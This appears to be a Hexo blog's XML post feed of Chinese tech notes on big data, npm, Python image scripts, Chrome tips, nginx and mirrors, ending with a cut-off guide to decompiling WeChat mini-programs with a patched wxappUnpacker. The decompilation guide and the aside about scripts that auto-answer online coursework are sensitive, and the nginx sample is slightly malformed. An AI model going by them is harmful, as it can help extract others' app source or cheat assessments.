技术搭建数据平台，这些企业的算法性能会很大程度上受限于低效的平台，更不可能开发出更高效的数据分析算法。但幸运的是大部分企业都基于商业版或者社区版 Hadoop 搭建了数据平台，这些公司的侧重点主要在应用发现和算法的设计层面，更有可能在不久的将来实现大数据的价值。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630224635515.png" alt="企业使用Hadoop搭建大数据平台情况"></p><h3 id="企业大数据平台的普遍组件"><a href="#企业大数据平台的普遍组件" class="headerlink" title="企业大数据平台的普遍组件"></a>企业大数据平台的普遍组件</h3><p>Apache Spark 是一个处理大规模数据的快速通用引擎，它可以独立运行，也可以在 Hadoop、Mesos、云端运行，它可以访问各种数据源包括 HDFS、Cassandra、HBase 和 S3，可以提升 Hadoop 集群中的应用在内存和磁盘上的运行速度。Spark 生态系统中除了核心 API 之外，还包括其他附加库，可以为大数据分析和机器学习领域提供更多的能力。本次调研中，Spark 是使用最普遍的大数据平台组件，使用率达到44%，而MapReduce使用率仅为21%。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200630224927300.png" alt="企业大数据平台包含组件分布(调查项为多选)"></p><p>分布式文件系统 HDFS 作为核心组件之一，使用率也达到了 39%。企业对大数据平台应用最多的场景是统计分析、报表生成及数据可视化，38% 企业使用ELK（ElasticSearch + Logstash + Kibana）实时日志分析平台。  </p><p>综上所述，目前大数据的发展热潮令人欢欣鼓舞。一个优秀的大数据团队，需要有对产品开发具有高敏感性同时对技术有一定理解的人才，同时需要理论基础极其扎实，能对实际问题进行抽象建模和算法设计的人才。只有双管齐下，在产品和技术方面进行深层次探索，才能真正实现大数据产业的繁荣。</p><h1 id="大数据与云计算、物联网"><a href="#大数据与云计算、物联网" class="headerlink" title="大数据与云计算、物联网"></a>大数据与云计算、物联网</h1><p>云计算、大数据和物联网相辅相成，既有联系又有区别。  </p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/317ee68ccc639db209ae0faba526c8f.jpg" alt="大数据与云计算、物联网的关系"></p><h2 id="云计算"><a href="#云计算" class="headerlink" title="云计算"></a>云计算</h2><p><strong>概念</strong>：云计算实现了通过网络提供可伸缩的、廉价的分布式计算能力，用户只需要在具备网络接入条件的地方，就可以随时随地获得所需的各种IT资源。</p><p><strong>关键技术</strong>：  虚拟化、分布式存储、分布式计算、多租户等。</p><p><strong>数据中心</strong>：</p><ul><li>云计算数据中心是一整套复杂的设施，包括刀片服务器、宽带网络连<br>接、环境控制设备、监控设备以及各种安全装置等</li><li>数据中心是云计算的重要载体，为云计算提供计算、存储、带宽等各种硬件资源，为各种平台和应用提供运行支撑环境</li><li>全国各地推进数据中心建设。</li></ul><p><strong>应用</strong>：  </p><ul><li>政务云上可以部署公共安全管理、容灾备份、城市管理、应急管理、智能交通、社会保障等应用，通过集约化建设、管理和运行，可以实现信<br>息资源整合和政务资源共享，推动政务管理创新，加快向服务型政府转型。</li><li>教育云可以有效整合幼儿教育、中小学教育、高等教育以及继续教育等优质教育资源，逐步实现教育信息共享、教育资源共享及教育资源深度挖掘等目标。</li><li>中小企业云能够让企业以低廉的成本建立财务、供应链、客户关系等管理应用系统，大大降低企业信息化门槛，迅速提升企业信息化水平，增强企业市场竞争力。</li><li>医疗云可以推动医院与医院、医院与社区、医院与急救中心、医院与家庭之间的服务共享，并形成一套全新的医疗健康服务系统，从而有效地提高医疗保健的质量。</li></ul><p><strong>产业</strong>：  云计算产业作为战略性新兴产业，近些年得到了迅速发展，形成了成熟的产业链结构，产业涵盖硬件与设备制造、基础设施运营、软件与解决方案供应商、基础设施即服务（IaaS）、平台即服务（PaaS）、软件即服务（SaaS）、终端设备、云安全、云计算交付/咨询/认证等环节。</p><h2 id="物联网"><a href="#物联网" class="headerlink" title="物联网"></a>物联网</h2><p><strong>概念</strong>：物联网是物物相连的互联网，是互联网的延伸，它利用局部网络或互联网等通信技术把传感器、控制器、机器、人员和物等通过新的方式联在一起，形成人与物、物与物相联，实现信息化和远程管理控制。  </p><p><strong>关键技术</strong>：   物联网中的关键技术包括识别和感知技术（二维码、RFID、传感器等）、网络与通信技术、数据挖掘与融合技术等。</p><p><strong>应用</strong>：  物联网已经广泛应用于智能交通、智慧医疗、智能家居、环保监测、智能安防、智能物流、智能电网、智慧农业、智能工业等领域，对国民经济与社会发展起到了重要的推动作用。</p><p><strong>产业</strong>：   完整的物联网产业链主要包括核心感应器件提供商、感知层末端设备提供商、网络提供商、软件与行业解决方案提供商、系统集成商、运营及服务提供商等六大环节。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://wikipediam.tw.wjbk.site/wiki/%E5%A4%A7%E6%95%B0%E6%8D%AE" target="_blank" rel="noopener">[1] 大数据——维基百科中文</a><br><a href="https://m.baidu.com/sf_bk/item/%E5%A4%A7%E6%95%B0%E6%8D%AE/1356941?fr=kg_general&amp;ms=1&amp;rid=7658366459364706321" target="_blank" rel="noopener">[2] 大数据——百度百科</a><br><a href="http://dblab.xmu.edu.cn/post/1089/" target="_blank" rel="noopener">[3] 《大数据技术基础》：林子雨</a><br><a href="http://dblab.xmu.edu.cn/post/bigdata/" target="_blank" rel="noopener">[4] 《大数据技术原理与应用》第二版：林子雨</a><br><a href="https://m.sohu.com/a/250942206_495461/?pvid=000115_3w_a" target="_blank" rel="noopener">[5] 大数据存储、计算、应用、可视化的基本概述：迅宜捷科技</a><br><a href="https://m.baidu.com/sf_baijiahao/s?id=1659675532780997134&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">[6] 两成开发者月薪超 1.7 万、算法工程师最紧缺：CSDN</a><br><a href="https://blog.csdn.net/chaishen10000/article/details/88564869" target="_blank" rel="noopener">[7] 2018-2019中国开发者调查报告简报（一文了解全貌）：柴神</a><br><a href="http://kns.cnki.net/KXReader/Detail?TIMESTAMP=637187568097763750&amp;DBCODE=CJFQ&amp;TABLEName=CAPJLAST&amp;FileName=DSJU20200220002&amp;RESULT=1&amp;SIGN=%2b3iFHhJ4zUnvkh5iaJ13uCgMcBI%3d" target="_blank" rel="noopener">[8]毕倪飞,丁光耀,陈启航,徐辰,周傲英. 数据流计算模型及其在大数据处理中的应用[J]. 大数据,,:1-19.</a><br><a href="http://kns.cnki.net/KXReader/Detail?TIMESTAMP=637187548969326250&amp;DBCODE=CJFQ&amp;TABLEName=CAPJLAST&amp;FileName=DSJU20200226002&amp;RESULT=1&amp;SIGN=EhYpH0Pm9adr3aMcD3MW2sgqjCU%3d" target="_blank" rel="noopener">[9]袁旭初,付国,毕继泽,张岩峰,聂铁铮,谷峪,鲍玉斌,于戈. 分布式数据流计算系统的数据缓存技术综述[J]. 大数据,,:1-22.</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux踩坑</title>
      <link href="2020/04/26/linux-cai-keng/"/>
      <url>2020/04/26/linux-cai-keng/</url>
      
        <content type="html"><![CDATA[<ul><li><p>打开管理员权限文件管理：<code>sudo nautilus</code><br>（用于拷贝文件的时候出现权限不够的情况）  </p></li><li><p>vim强行保存只读文件 <code>w !sudo tee %</code></p></li><li><p>centos7中python读取文件需要填写绝对路径（试过windows的PC上能运行，但是服务器上提示读取不到该文件）</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm包管理</title>
      <link href="2020/04/21/npm-bao-guan-li/"/>
      <url>2020/04/21/npm-bao-guan-li/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>npm是个包管理工具（想象一个项目中上千个包该怎么管理，嗯，到底香在哪里不用我多说了吧？）</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li>安装git</li><li>安装并配置nodejs</li></ol><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p>下载并安装Git，在<code>我的电脑-鼠标右键添加属性-高级系统设置-环境变量-系统变量-Path</code>处添加变量，例如安装路径是<code>D:\Git</code>，那么就添加变量</p><p><a href="https://blog.csdn.net/sanxd/article/details/82624127" target="_blank" rel="noopener">具体看这个吧，太久了～我怕遗漏了什么步骤</a></p><p><code>D:\Git\usr\bin\</code></p><p><code>D:\Git\usr\bin\ssh-keygen.exe</code></p><p>这样就能在电脑的任意文件夹位置打开git</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/80ef2b6371e96bf39133297493ccf7e.png" alt=""></p><h3 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h3><p>nodejs安装没什么好说的，建议安装<code>最高版本的稳定版本</code>，直接在官网下载然后下一步～下一步</p><p><a href="https://nodejs.org/dist/" target="_blank" rel="noopener">https://nodejs.org/dist/</a>    官网，直接选择合适的版本</p><p>如果不知道怎么选，可以下载这个 <a href="https://nodejs.org/dist/v12.10.0/（现在是2020年）" target="_blank" rel="noopener">https://nodejs.org/dist/v12.10.0/（现在是2020年）</a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>安装淘宝镜像</p><p>npm config set registry <a href="https://registry.npm.taobao.org" target="_blank" rel="noopener">https://registry.npm.taobao.org</a></p><p>之后就用<code>cnpm</code>命令代替<code>npm</code>命令了</p><h2 id="使用"><a href="#使用" class="headerlink" title="　使用"></a>　使用</h2><p>一般项目把代码放到github等平台，都不会放依赖包的，为什么？因为有些人有这些依赖包了，有些人又没人，而且全都放到代码托管平台可能导致文件很大，所以合适的方式是写清楚自己用了什么依赖包。这些依赖包信息会写在一个叫<code>package.json</code>的文件，这个package.json打开是这样子的：</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200713015959811.png" alt="package.json文件内容"></p><p>不用管这个，如果要安装上述依赖包，那么只要在放着package.json的这个文件目录打开<code>git bash</code>，输入</p><pre><code>cnpm install</code></pre><p>（这里使用淘宝镜像，所以是cnpm；如果不使用淘宝镜像则是<code>npm install</code>）</p><p>然后会在当前目录生成一个<code>node_modules</code>文件夹，这个文件夹里就放着依赖包。</p><h2 id="关于全局与局部安装依赖包"><a href="#关于全局与局部安装依赖包" class="headerlink" title="关于全局与局部安装依赖包"></a>关于全局与局部安装依赖包</h2><p>如果要安装某个依赖包，例如安装hexo-renderer-marked，则输入</p><pre><code>cnpm install hexo-renderer-kramed --save</code></pre><p>这样依赖包会安装在<strong>当前目录的</strong><code>node_modules</code>文件夹里，这种是局部安装的模式</p><p>如果输入的是</p><pre><code>cnpm install -g hexo-renderer-kramed</code></pre><p>则会安装到你的node文件夹目录下，即全局安装</p><h3 id="关于版本号"><a href="#关于版本号" class="headerlink" title="关于版本号"></a>关于版本号</h3><p>如果要安装指定版本，可以在依赖包后面加上 <code>@版本号</code>，例如：</p><pre><code>cnpm install hexo-renderer-kramed@0.1.4  --save</code></pre><p>有时候会见到<code>@^版本号</code>这样的，^表示匹配较高版本的包</p><ul><li><code>~</code>会匹配最近的小版本依赖包，比如@~1.2.3会匹配所有1.2.x版本，但是不包括1.3.0</li><li><code>^</code>会匹配最新的大版本依赖包，比如@^1.2.3会匹配所有1.x.x的包，包括1.3.0，但是不包括2.0.0</li></ul><p>如果是卸载，在install前面加个un就行啦，例如：</p><pre><code>cnpm uninstall hexo-renderer-kramed --save</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像裁剪</title>
      <link href="2020/04/04/tu-xiang-cai-jian/"/>
      <url>2020/04/04/tu-xiang-cai-jian/</url>
      
        <content type="html"><![CDATA[<ul><li><p>文件目录树</p><pre><code>│  ImageCut.py│├─cut_img│     cut_test.jpg│└─images      test.jpg</code></pre></li></ul><hr><pre class=" language-lang-python"><code class="language-lang-python"># 导入相关的库from PIL import Imageimport os#读取images文件夹内的图片名称images_list = os.listdir('images/')for i in range(0,len(images_list),1):    # 打开一张图    img = Image.open("images/"+images_list[i])    # 图片尺寸    img_size = img.size    h = img_size[1]  # 图片高度    w = img_size[0]  # 图片宽度    x = 0.2 * w    y = 0.1 * h    w = 0.55 * w    h = 0.75 * h    # 开始截取    region = img.crop((x, y, x + w, y + h))    if (os.path.exists('cut_img')==False):        os.mkdir("cut_img")    # 保存图片    region.save("cut_img"+"/"+"cut_"+images_list[i])</code></pre>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像加噪</title>
      <link href="2020/04/04/tu-xiang-jia-zao/"/>
      <url>2020/04/04/tu-xiang-jia-zao/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在有些情况下，会因为研究需要所以用一些增加了噪声的图片</p><ul><li><p>文件目录树</p><pre><code>│  GaussianNoise.py                #高斯噪声│  SpicedSaltNoise.py            #盐椒噪声│  ├─images         #将所有需要处理的所有图片该文件夹内│      test.jpg    #原图│      └─noise_img    ├─Gussian_noise_img            #存放加入高斯噪声图像的文件夹    │      Gussian_noise_test.jpg     │          └─salt-and-pepper_noise_img        #存放加入盐椒噪声图像的文件夹            salt-and-pepper_noise_test.jpg</code></pre><p>​        </p></li></ul><h2 id="高斯噪声"><a href="#高斯噪声" class="headerlink" title="高斯噪声"></a>高斯噪声</h2><pre class=" language-lang-python"><code class="language-lang-python"># 增加高斯噪声from skimage import ioimport randomimport numpy as npimport osimport matplotlibdef gauss_noise(image):    img = image.astype(np.int16)  # 此步是为了避免像素点小于0，大于255的情况    mu = 0    sigma = 10    for i in range(img.shape[0]):        for j in range(img.shape[1]):            for k in range(img.shape[2]):                img[i, j, k] = img[i, j, k] + random.gauss(mu=mu, sigma=sigma)    img[img > 255] = 255    img[img < 0] = 0    img = img.astype(np.uint8)    return imgif __name__ == '__main__':    # 读取images文件夹内的图片名称    images_list = os.listdir('images/')    for i in range(0, len(images_list), 1):        img = io.imread(r"images/"+images_list[i])        # noise_img = salt_and_pepper_noise(img)        gauss_img = gauss_noise(img)        # io.imshow(gauss_img)        # io.show()        if (os.path.exists('noise_img\\Gussian_noise_img') == False):            os.mkdir("noise_img\\Gussian_noise_img")    #此步骤用于判断有无存放噪声图片的文件夹，没有则创建        matplotlib.image.imsave("noise_img/Gussian_noise_img/"+"Gussian_noise_" + images_list[i], gauss_img) #numpy数组转换为图片保存</code></pre><h2 id="盐椒噪声"><a href="#盐椒噪声" class="headerlink" title="盐椒噪声"></a>盐椒噪声</h2><pre class=" language-lang-python"><code class="language-lang-python">#增加椒盐噪声from skimage import ioimport randomimport numpy as npimport osimport matplotlibdef salt_and_pepper_noise(img, proportion=0.10):   #此处数值设置椒盐噪声强度    noise_img = img    height, width = noise_img.shape[0], noise_img.shape[1]    num = int(height * width * proportion)  # 多少个像素点添加椒盐噪声    for i in range(num):        w = random.randint(0, width - 1)        h = random.randint(0, height - 1)        if random.randint(0, 1) == 0:            noise_img[h, w] = 0        else:            noise_img[h, w] = 255    return noise_imgif __name__ == '__main__':    images_list = os.listdir('images/')    for i in range(0, len(images_list), 1):        img = io.imread(r"images/"+images_list[i])        noise_img = salt_and_pepper_noise(img)        # io.imshow(noise_img)        # io.show()        if (os.path.exists('noise_img\\salt-and-pepper_noise_img') == False):            os.mkdir("noise_img\\salt-and-pepper_noise_img")    #此步骤用于判断有无存放噪声图片的文件夹，没有则创建        matplotlib.image.imsave("noise_img/salt-and-pepper_noise_img/"+"salt-and-pepper_noise_" + images_list[i], noise_img) #numpy数组转换为图片保存</code></pre>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chrome使用技巧</title>
      <link href="2020/04/01/chrome-shi-yong-ji-qiao/"/>
      <url>2020/04/01/chrome-shi-yong-ji-qiao/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>chrome相信大家都不陌生，作为一名专业（Ctrl CV）的程序员，搜索引擎当然是一个很重要的生产工具啦，在此篇章将介绍一些有用chrome插件以及<strong>搜索使用技巧</strong>。</p><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><h3 id="Chrome上网助手"><a href="#Chrome上网助手" class="headerlink" title="Chrome上网助手"></a>Chrome上网助手</h3><p>咳咳…首先你得有这个，才能打开chrome网上应用商店</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/990077b40c93f69a76551470a9dfe45.png" alt=""></p><p>直接百度搜索这个插件名称，下载，得到zip文件，解压，解压出来有好几个文件，然后鼠标点击chrome右上角三个点处，更多工具-扩展程序，打开开发者模式，加载已解压的扩展程序，选择之前zip文件解压出来的文件夹,关闭开发者模式就OK了。</p><p>但是，这种安装方法只是对这个插件，如果是非应用商店下载的插件，很可能是个crx文件，开发者模式下直接拖到扩展程序会报错，正确的安装方式是：<strong>将crx文件的后缀crx改成zip或者rar，然后解压出来，再开发者模式下加载已解压的扩展程序</strong></p><h3 id="Infinity新标签页-Pro"><a href="#Infinity新标签页-Pro" class="headerlink" title="Infinity新标签页(Pro)"></a>Infinity新标签页(Pro)</h3><p>啥也不说，就冲着搜索界面也要下载，更何况有<strong>自定义搜索</strong>（很重要），在搜索介绍里将详细介绍使用自定义搜索方便快捷地搜索。</p><p>如果是在chrome应用商店下载的就不用像上一步那样安装了，直接同意添加到扩展程序就行了。</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/575b654ef47e180346f5a8232c523d1.png" alt=""></p><h3 id="Tempermonkey"><a href="#Tempermonkey" class="headerlink" title="Tempermonkey"></a>Tempermonkey</h3><p>这应该是最多人用的脚本插件了，网页脚本就靠这些插件运行，像读书的时候上一些网课，找些自动签到答题啥的脚本就用这个加载，方便……咳咳</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/2ca3135dbf675185d6f771d4eefb536.png" alt=""></p><p>网上力推的插件挺多，但具体怎样还是看个人，这里就不多讲啦。</p><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><h3 id="自定义搜索"><a href="#自定义搜索" class="headerlink" title="自定义搜索"></a>自定义搜索</h3><p>对于一个问题，新手搜索通常会带上谓语等;稍微有点经验或者学习过信息检索的人员一般都去掉谓语用空格隔开;老司机直接搜索 site:(stackoverflow.com) problem  </p><p>例如问题：How to solve cookie sqlite error 1555? (Python &amp; Selenium)</p><p>新手搜索：How to solve cookie sqlite error 1555? (Python &amp; Selenium)</p><p>熟练的人搜索： cookie sqlite error 1555</p><p>（PS: 英文还好，要是中文，怎么，怎样，如何……都差不多的意思，要是带上这些词显然搜索的范围就小了，所以去掉这些废话，搜索只搜 <strong>关键词</strong>，而且中文搜索尽量在两个关键词之间加上<strong>空格</strong>）</p><p>老司机搜索： site:(stackoverflow.com)  cookie sqlite error 1555</p><p>但是，每次都要输入site:(stackoverflow.com)不烦吗？特别是在想着如何解决问题地时候却要机械地输入一串字符，于是我们用一下<em>Infinity新标签页(Pro)</em>的<strong>自定义搜索</strong>，只需要简单两步：</p><ul><li><p>首页，找到stackoverflow的搜索链接，如图</p><p>在stackoverflow的搜索框里输入任意的词，例如下面画绿线的，然后就会看到网址出现变换， 例如这里是<code>stackoverflow.com/search?q=</code>   ,把这个复制下来</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/微信图片_20200401160652.png" alt=""></p></li><li><p>然后，在Infinity新标签页(Pro)里添加自定义搜索，没错，搜索链接就是上图的链接<code>https://stackoverflow.com/search?q=</code></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/微信图片_20200401160503.png" alt=""></p><p>其他网站例如github也一样如法炮制</p></li></ul><h3 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h3><p>Ctrl+shift+B 隐藏/显示书签</p><p>Ctrl+shift+O打开书签管理</p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx反向代理</title>
      <link href="2020/03/30/nginx-fan-xiang-dai-li/"/>
      <url>2020/03/30/nginx-fan-xiang-dai-li/</url>
      
        <content type="html"><![CDATA[<p>通过Nginx反向代理加速网站访问速度</p><p>ip示例：106.42.254.40</p><p>二级域名示例：oj.example.com</p><pre><code>server {     listen 443;     server_name onj.example.com;     ssl on;    ssl_certificate /www/wwwroot/ssl/oj/oj.example.com.crt;    ssl_certificate_key /www/wwwroot/ssl/oj/oj.example.com   ssl_certificate_key /etc/ssl/2_baofeidyz.com.key;        ssl_session_timeout 5m;        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;        ssl_prefer_server_ciphers on;    location / {       proxy_set_header X-Real-IP $remote_addr;       proxy_set_header Host $http_host;       proxy_pass http://106.42.154.40/;     } }</code></pre>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux/anoconda更换镜像</title>
      <link href="2020/03/30/linux-anoconda-geng-huan-jing-xiang/"/>
      <url>2020/03/30/linux-anoconda-geng-huan-jing-xiang/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>国内使用linux/anaconda官方源很慢，所以一般都使用镜像源</p><p>（PS：镜像网站是指每隔一段时间就同步更新到与另外一个网站资源相同的网站）</p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="ubuntu-18-04LTS"><a href="#ubuntu-18-04LTS" class="headerlink" title="ubuntu 18.04LTS"></a>ubuntu 18.04LTS</h3><pre><code># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse# 预发布软件源，不建议启用# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</code></pre><h3 id="centos7"><a href="#centos7" class="headerlink" title="centos7"></a>centos7</h3><pre><code># CentOS-Base.repo## The mirror system uses the connecting IP address of the client and the# update status of each mirror to pick mirrors that are updated to and# geographically close to the client.  You should use this for CentOS updates# unless you are manually picking other mirrors.## If the mirrorlist= does not work for you, as a fall back you can try the# remarked out baseurl= line instead.##[base]name=CentOS-$releasever - Basebaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/os/$basearch/#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=osenabled=1gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-7#released updates[updates]name=CentOS-$releasever - Updatesbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/updates/$basearch/#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updatesenabled=1gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-7#additional packages that may be useful[extras]name=CentOS-$releasever - Extrasbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/extras/$basearch/#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extrasenabled=1gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-7#additional packages that extend functionality of existing packages[centosplus]name=CentOS-$releasever - Plusbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/centosplus/$basearch/#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplusgpgcheck=1enabled=0gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-7</code></pre><pre><code>sudo yum makecache    #更新软件包缓存</code></pre><h2 id="anaconda"><a href="#anaconda" class="headerlink" title="anaconda"></a>anaconda</h2><p>anaconda 添加清华镜像源:</p><p><code>pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</code></p><p>【讲真，有时候清华镜像会挂掉，推荐用阿里镜像】</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://mirror.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener">清华镜像 Ubuntu 镜像使用帮助</a></p><p><a href="https://mirror.tuna.tsinghua.edu.cn/help/centos/" target="_blank" rel="noopener">清华镜像 centos 镜像使用帮助</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序反编译</title>
      <link href="2020/03/25/wei-xin-xiao-cheng-xu-fan-bian-yi/"/>
      <url>2020/03/25/wei-xin-xiao-cheng-xu-fan-bian-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>使用wxappUnpacker安装小程序反编译工具（2020.03）</p><p><strong>关键词:</strong> 小程序 wxss</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>上次分享了<a href="工具：web前端爬取">web前端爬取工具</a> ，那么这次也同样讲讲微信小程序反编译吧，对于像博主这种审美奇低且前端技术渣渣的人来说，实在是利器呀。不过尽量只是反编译来学习研究啦！</p><h2 id="安装反编译脚本"><a href="#安装反编译脚本" class="headerlink" title="安装反编译脚本"></a>安装反编译脚本</h2><p>首先，得先了解下怎么安装,内容过长，我就不Ctrl CV了(主要是安装简单，成功并且完美地编译难)</p><p>完美地反编译出来难就难在微信小程序一直更新，但是编译工具又是旧的</p><p>First,<a href="https://www.jianshu.com/p/97b7d5498dcd" target="_blank" rel="noopener">终于成功了，分享一波超详细小程序源码获取方法——图文!</a></p><p>如果想省事，安装nodejs之后直接下载下面的链接的文件替换掉你的反编译工具：</p><p><a href="https://gitee.com/Sao-operation/wxappUnpacker/repository/archive/master.zip" target="_blank" rel="noopener">https://gitee.com/Sao-operation/wxappUnpacker/repository/archive/master.zip</a></p><p>如果你只是样式编译出问题了（就是page的wxss都是空白的），那么</p><ul><li>修改wxappUnpacker文件中的 <code>wuWxss.js</code></li></ul><pre class=" language-lang-css"><code class="language-lang-css">function runVM(name, code) {      // let wxAppCode = {}, handle = {cssFile: name};      // let vm = new VM({      //    sandbox: Object.assign(new GwxCfg(), {      //       __wxAppCode__: wxAppCode,      //       setCssToHead: cssRebuild.bind(handle)      //    })      // });      // vm.run(code);      // for (let name in wxAppCode) if (name.endsWith(".wxss")) {      //    handle.cssFile = path.resolve(frameName, "..", name);      //    wxAppCode[name]();      // }      let wxAppCode = {};      let handle = {cssFile: name};      let gg = new GwxCfg();      let tsandbox = {         $gwx: GwxCfg.prototype["$gwx"],         __mainPageFrameReady__: GwxCfg.prototype["$gwx"],   //解决 $gwx is not defined         __vd_version_info__: GwxCfg.prototype["$gwx"],  //解决 __vd_version_info__ is not defined         __wxAppCode__: wxAppCode,         setCssToHead: cssRebuild.bind(handle)      }      let vm = new VM({sandbox: tsandbox});      vm.run(code);      for (let name in wxAppCode) {         if (name.endsWith(".wxss")) {            handle.cssFile = path.resolve(frameName, "..", name);            wxAppCode[name]();         }      }   }</code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="获取wxapkg文件"><a href="#获取wxapkg文件" class="headerlink" title="获取wxapkg文件"></a>获取wxapkg文件</h3><ol><li><p>安装夜深模拟器（但是这里有个问题，夜深模拟器可能用不了，我只记得是多开器里开一个新的才行，而且以后每次使用都得切换成那个新的）</p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/FrontEnd/e09793ce1f6c1e1b7df8ee715ffe644.png" width="50%" 